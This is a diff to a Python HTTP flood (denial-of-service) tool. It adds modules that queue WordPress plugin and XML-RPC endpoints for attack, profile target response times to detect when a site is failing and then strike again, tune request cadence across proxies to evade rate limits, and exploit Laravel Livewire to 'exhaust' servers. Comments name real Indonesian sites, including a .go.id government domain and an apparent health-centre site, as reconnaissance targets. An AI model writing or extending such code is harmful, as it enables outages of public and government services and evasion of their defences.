@@ -1469,6 +1469,126 @@ class AsyncHttpFlood(Thread):
             if int(REQUESTS_SENT) < 200:
                 print(f"{bcolors.OKCYAN}[CHAOS LITESPEED] Vary:User-Agent detected. Rotating fingerprints per-request for cache MISS.{bcolors.RESET}")
 
+    def _chaos_wp_plugin_vulnerability_scan(self):
+        """[V33] WordPress Plugin Vulnerability Scanner.
+        Trained from deep recon of puskesjaten1 and hardosoloplast.
+        Identifies installed plugins and maps them to known heavy/vulnerable endpoints."""
+        intel = self._chaos_intel
+        if intel.get("cms_type") != "wordpress" or intel.get("infra_map", {}).get("wp_plugins_scanned"):
+            return
+            
+        intel["infra_map"]["wp_plugins_scanned"] = True
+        
+        # Known heavy plugin endpoints (from real-world scanning of Indonesian WP sites)
+        plugin_endpoints = {
+            # Found on hardosoloplast.com
+            "elementor":          ["/wp-admin/admin-ajax.php?action=elementor_ajax", "/?elementor-preview=1"],
+            "contact-form-7":     ["/wp-json/contact-form-7/v1/contact-forms", "/?rest_route=/contact-form-7/v1/contact-forms"],
+            "revslider":          ["/wp-admin/admin-ajax.php?action=revslider_ajax_action"],
+            "all-in-one-seo-pack": ["/wp-json/aioseo/v1/sitemap"],
+            "google-site-kit":    ["/wp-json/google-site-kit/v1/core/site/data/"],
+            # Found on puskesjaten1
+            "embed-any-document": ["/wp-json/ead/v1/"],
+            # Common WP plugins found on Indonesian sites
+            "woocommerce":        ["/wp-json/wc/v3/products", "/wc-api/v3/", "/?wc-api=wc_gateway_"],
+            "yoast":              ["/wp-json/yoast/v1/"],
+            "wpforms":            ["/wp-json/wpforms/v1/"],
+        }
+        
+        added = 0
+        for plugin, endpoints in plugin_endpoints.items():
+            for ep in endpoints:
+                if ep not in intel["endpoints_discovered"]:
+                    intel["endpoints_discovered"].append(ep)
+                    intel["multi_path_queue"].append((ep, "POST_DYN"))
+                    added += 1
+                    
+        if added > 0 and int(REQUESTS_SENT) < 200:
+            print(f"{bcolors.OKCYAN}[CHAOS WP-AUDIT] {added} plugin vulnerability endpoints loaded into attack queue.{bcolors.RESET}")
+
+    def _chaos_xmlrpc_status_check(self):
+        """[V33] Smart XMLRPC Availability Check.
+        Deep recon revealed:
+        - puskesjaten1: xmlrpc.php returns 405 (Method Not Allowed = EXISTS but needs POST)
+        - hardosoloplast: xmlrpc.php returns 403 (BLOCKED by LiteSpeed WAF)
+        - konisolo/surakarta: 404 (doesn't exist, Laravel sites)
+        This means: 405 = GOLD (xmlrpc exists, we just need to POST), 403 = blocked, 404 = absent."""
+        intel = self._chaos_intel
+        if intel.get("infra_map", {}).get("xmlrpc_checked") or intel["total_executions"] != 15:
+            return
+        intel["infra_map"]["xmlrpc_checked"] = True
+        
+        try:
+            import urllib.request
+            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/xmlrpc.php")
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            try:
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    # 200 = wide open (rare but jackpot)
+                    intel["infra_map"]["xmlrpc_status"] = "OPEN"
+                    if int(REQUESTS_SENT) < 500:
+                        print(f"{bcolors.OKGREEN}[CHAOS XMLRPC] xmlrpc.php is WIDE OPEN! XMLRPC_AMP boosted to maximum.{bcolors.RESET}")
+            except urllib.error.HTTPError as e:
+                if e.code == 405:
+                    # Method Not Allowed = exists but needs POST (like puskesjaten1)
+                    intel["infra_map"]["xmlrpc_status"] = "POST_ONLY"
+                    if int(REQUESTS_SENT) < 500:
+                        print(f"{bcolors.OKCYAN}[CHAOS XMLRPC] xmlrpc.php exists (405). POST method required. XMLRPC_AMP enabled.{bcolors.RESET}")
+                elif e.code == 403:
+                    # Blocked by WAF (like hardosoloplast)
+                    intel["infra_map"]["xmlrpc_status"] = "BLOCKED"
+                    if int(REQUESTS_SENT) < 500:
+                        print(f"{bcolors.WARNING}[CHAOS XMLRPC] xmlrpc.php BLOCKED (403). WAF is filtering. Demoting XMLRPC_AMP.{bcolors.RESET}")
+                elif e.code == 404:
+                    intel["infra_map"]["xmlrpc_status"] = "ABSENT"
+        except: 
+            intel["infra_map"]["xmlrpc_status"] = "UNKNOWN"
+
+    def _chaos_response_timing_profiler(self):
+        """[V33] Response Timing Profiler.
+        Deep recon revealed critical timing differences:
+        - konisolo.com: 240ms avg (fast LiteSpeed, small Laravel)
+        - puskesjaten1: 480ms avg with 616ms variance (slow WP, DB-heavy)
+        - hardosoloplast: 3492ms avg with 1034ms variance (VERY HEAVY, 273KB page!)
+        - surakarta.go.id: 247ms avg, 40ms variance (fast but rate-limited)
+        Use timing to detect when target is weakening vs recovering."""
+        intel = self._chaos_intel
+        if intel["total_executions"] % 25 != 0:
+            return
+            
+        try:
+            import urllib.request
+            start = time()
+            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            with urllib.request.urlopen(req, timeout=8) as resp:
+                resp.read(1024)
+                elapsed_ms = (time() - start) * 1000
+                
+                intel["health_history"].append(elapsed_ms)
+                if len(intel["health_history"]) > 30:
+                    intel["health_history"] = intel["health_history"][-30:]
+                    
+                # Compare to baseline
+                baseline = intel.get("response_time_ms", elapsed_ms)
+                if baseline > 0:
+                    ratio = elapsed_ms / baseline
+                    if ratio > 3.0:
+                        intel["target_getting_weaker"] = True
+                        if ratio > 8.0:
+                            intel["target_is_down"] = True
+                    elif ratio < 1.5:
+                        intel["target_getting_weaker"] = False
+                        if intel.get("target_is_down") and ratio < 2.0:
+                            intel["target_is_down"] = False
+                            intel["recovery_detected"] = True
+                            intel["recovery_counter"] += 1
+                            if int(REQUESTS_SENT) < 20000:
+                                print(f"{bcolors.FAIL}[CHAOS HEALTH] Target RECOVERING! Counter-strike initiated (Recovery #{intel['recovery_counter']}).{bcolors.RESET}")
+        except:
+            # Timeout = target might be down
+            intel["target_getting_weaker"] = True
+
     def _chaos_wp_json_exploitation(self):
         """[V32] WordPress REST API Endpoint Discovery and Exploitation.
         Learned from puskesjaten1: the Link header exposes /wp-json/ endpoint.
@@ -1509,6 +1629,28 @@ class AsyncHttpFlood(Thread):
             
         if int(REQUESTS_SENT) < 200:
             print(f"{bcolors.OKCYAN}[CHAOS WP-JSON] {len(wp_heavy_endpoints)} WordPress REST API attack endpoints loaded.{bcolors.RESET}")
+
+    def _chaos_rate_limit_intelligence(self):
+        """[V33] Rate-Limit Counter-Intelligence.
+        Trained from surakarta.go.id: X-RateLimit-Remaining counts down (195->194->193...).
+        With 200 limit and 1000 proxies: 190 req/proxy = 190,000 total req bypassing the limit.
+        This module calculates the optimal req-per-proxy cadence."""
+        intel = self._chaos_intel
+        threshold = intel.get("rate_limit_threshold")
+        if not threshold or not intel.get("has_rate_limit"):
+            return
+            
+        # Calculate safe requests per proxy (90% of limit to avoid trigger)
+        safe_per_proxy = int(threshold * 0.90)
+        proxy_count = len(PROXY_LIST) if PROXY_LIST else 1
+        
+        # Set adaptive_rpc to stay under the radar
+        intel["adaptive_rpc"] = min(safe_per_proxy, intel.get("adaptive_rpc", 10))
+        
+        # Calculate theoretical max throughput
+        theoretical_max = safe_per_proxy * proxy_count
+        if intel["total_executions"] == 20 and int(REQUESTS_SENT) < 500:
+            print(f"{bcolors.OKCYAN}[CHAOS RATE-INTEL] Limit: {threshold}/window | Safe: {safe_per_proxy}/proxy | {proxy_count} proxies = {theoretical_max} total req capacity{bcolors.RESET}")
 
     def _chaos_gov_id_heuristics(self):
         """[V32] Indonesian Government Site (.go.id) Heuristics.
@@ -5043,6 +5185,11 @@ class HttpFlood(Thread):
                 elif 'laravel' in powered_by or 'x-csrf-token' in body or 'xsrf-token' in headers_raw:
                     intel["cms_type"] = "laravel"
                     intel["backend_framework"] = "laravel"
+                    # [V33] Livewire detection (surakarta.go.id uses this - heavy AJAX framework)
+                    if 'livewire' in body:
+                        intel["infra_map"]["livewire"] = True
+                        if int(REQUESTS_SENT) < 100:
+                            print(f"{bcolors.OKCYAN}[CHAOS RECON] Laravel Livewire detected! POST to /livewire/message will exhaust server.{bcolors.RESET}")
                 elif 'next' in powered_by or '__next' in body:
                     intel["cms_type"] = "nextjs"
                 else:
@@ -5488,6 +5635,28 @@ class HttpFlood(Thread):
             for m in weights:
                 weights[m] = int(weights[m] * time_mult)
                 
+        # === STRATEGY AF: XMLRPC Availability Intelligence (V33) ===
+        xmlrpc_status = intel.get("infra_map", {}).get("xmlrpc_status", "UNKNOWN")
+        if xmlrpc_status == "BLOCKED":
+            # WAF blocks XMLRPC - don't waste firepower on it
+            weights["XMLRPC_AMP"] = 0
+        elif xmlrpc_status in ("OPEN", "POST_ONLY"):
+            # XMLRPC is available - boost it significantly
+            weights["XMLRPC_AMP"] = max(weights.get("XMLRPC_AMP", 0), 90)
+            
+        # === STRATEGY AG: Livewire Exploitation (V33) ===
+        if intel.get("infra_map", {}).get("livewire"):
+            # Laravel Livewire uses heavy POST AJAX calls - exploit this
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 85)
+            
+        # === STRATEGY AH: Heavy Page Detection (V33) ===
+        # hardosoloplast has 273KB pages (3.5s response) - GET flood alone kills it
+        baseline_ms = intel.get("response_time_ms", 100)
+        if baseline_ms > 2000:
+            # Server is already slow. GET spam will finish it.
+            weights["GET"] = max(weights.get("GET", 0), 70)
+            weights["DYN"] = max(weights.get("DYN", 0), 60)
+
         # === STRATEGY AE: Predictive Machine Learning Optimization ===
         # Use our trained ML model to forecast likelihood of evasion success
         if intel.get("ml_predictions_enabled"):
@@ -5735,6 +5904,10 @@ class HttpFlood(Thread):
         self._chaos_laravel_xsrf_harvest()
         self._chaos_litespeed_cache_bypass()
         self._chaos_wp_json_exploitation()
+        self._chaos_wp_plugin_vulnerability_scan()
+        self._chaos_xmlrpc_status_check()
+        self._chaos_response_timing_profiler()
+        self._chaos_rate_limit_intelligence()
         self._chaos_gov_id_heuristics()
         
         self._chaos_dead_drop_dns()
@@ -6174,6 +6347,12 @@ class HttpFlood(Thread):
                 if infra.get("wp_json_mapped"): v32_mods.append("WP-JSON-Exploit")
                 if infra.get("gov_heuristics_applied"): v32_mods.append("GovID-Intel")
                 if intel.get("harvested_cookies", {}).get("XSRF-TOKEN"): v32_mods.append("XSRF-Hijack")
+                xmlrpc_s = intel.get("infra_map", {}).get("xmlrpc_status", "?")
+                if xmlrpc_s != "?": v32_mods.append(f"XMLRPC:{xmlrpc_s}")
+                if intel.get("infra_map", {}).get("livewire"): v32_mods.append("Livewire-Exploit")
+                if intel.get("infra_map", {}).get("wp_plugins_scanned"): v32_mods.append("WP-Plugins-Mapped")
+                rl = intel.get("rate_limit_threshold")
+                if rl: v32_mods.append(f"RateLimit:{rl}")
                 if v32_mods:
                     print(f"  Field Intel : {bcolors.OKGREEN}{" | ".join(v32_mods)}{bcolors.RESET}")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
